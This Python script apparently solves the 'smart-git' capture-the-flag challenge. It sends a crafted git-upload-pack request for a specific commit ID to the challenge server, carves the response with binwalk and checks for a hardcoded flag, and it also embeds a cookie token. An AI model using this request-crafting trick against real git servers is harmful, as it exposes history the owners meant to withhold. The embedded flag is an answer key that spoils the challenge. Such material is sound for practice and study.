import requests
import os
import sys

url = "https://smart-git.chall.lac.tf/flag.git/git-upload-pack"

# you can get this commit ID by git clone --depth 2, and using git cat-file to see parents

payload = "00a4want a05ecc287bcd996a29e39745869c2fffe43e1d1a multi_ack_detailed no-done side-band-64k thin-pack include-tag ofs-delta deepen-since deepen-not agent=git/2.43.0\n00000009done\n"
headers = {
  'Content-Type': 'application/x-git-upload-pack-request',
  'Cookie': 'csrftoken=LItDvtKzIsTVo0cLeuU57fwakWDQFUikf2R4aMSnY6dwotNGZDvjd4pGSwozrTIM'
}

response = requests.request("POST", url, headers=headers, data=payload)
import zlib


content = response.content.split(b"PACK", 1)[1].split(b"Total", 1)[0]


res = input("Warning: script messes with file in current directory, and requires binwalk installed on a linux-like system. Continue? [y/n] ")
if res != "y":
    sys.exit(-1)

os.system("rm -r _tempfile.extracted")
os.system("rm tempfile")

with open("tempfile", "wb") as f:
    f.write(content)
    print("Binwalk of content")
    os.system("binwalk tempfile -e")
os.system("rm tempfile")


from pathlib import Path

pathlist = Path("_tempfile.extracted").glob('**/*')
for path in pathlist:
    # because path is object not string
    path_in_str = str(path)   
    with open(path_in_str, "rb") as f:
        if b"lactf{0ut5m4r7_7h3_5m4r5_g1t_s3rv}" in f.read():
            print("Found flag!")
            os.system("rm -r _tempfile.extracted")
            sys.exit(0)
print("Flag not found")
os.system("rm -r _tempfile.extracted")
sys.exit(1)
